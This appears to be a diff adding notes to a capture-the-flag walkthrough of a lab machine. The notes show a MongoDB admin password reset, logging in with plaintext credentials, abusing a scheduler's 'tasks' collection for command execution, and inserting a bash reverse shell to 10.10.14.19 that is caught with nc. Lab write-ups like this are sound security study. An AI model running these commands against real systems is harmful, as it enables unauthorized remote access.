@@ -14,3 +14,54 @@ mongo "mongodb://localhost:27017"
 
 User Password Reset to "12345"
 > db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
+
+Connect
+I’ll connect to the DB using the Mongo client specifying the user, password, and database to connect to:
+
+mark@node:/$ mongo -u mute -p 5AYRft73VtFpc84k scheduler
+MongoDB shell version: 3.2.16
+connecting to: scheduler
+> 
+In Mongo, a database (like scheduler) has collections (kind of like tables in SQL). This db has one collection:
+> show collections
+tasks
+
+The collection has no objects in it:
+> db.tasks.find()
+
+POC
+I’ll test execution by adding a command to touch a file in /tmp:
+
+> db.tasks.insert({"cmd": "touch /tmp/mute"})
+WriteResult({ "nInserted" : 1 })
+> db.tasks.find()
+{ "_id" : ObjectId("60b6e551e6bccdfbc52f13ca"), "cmd" : "touch /tmp/mute" }
+
+30 seconds later, the object is gone:
+
+> db.tasks.find()
+
+In /tmp, a new file is there owned by tom:
+
+mute@hack:/tmp$ ls -l mute 
+-rw-r--r-- 1 tom tom 0 Jun  2 02:56 mute
+
+Shell
+Now I’ll insert a reverse shell into the DB as the command:
+
+> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'"})
+WriteResult({ "nInserted" : 1 })
+> db.tasks.find()
+{ "_id" : ObjectId("60b6e61ee6bccdfbc52f13cb"), "cmd" : "bash -c 'bash -i >& /dev/tcp/10.10.14.19/443 0>&1'" }
+
+30 seconds later, there’s a connection at nc:
+
+mute@hack$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.58] 47666
+bash: cannot set terminal process group (1223): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+tom@node:/$
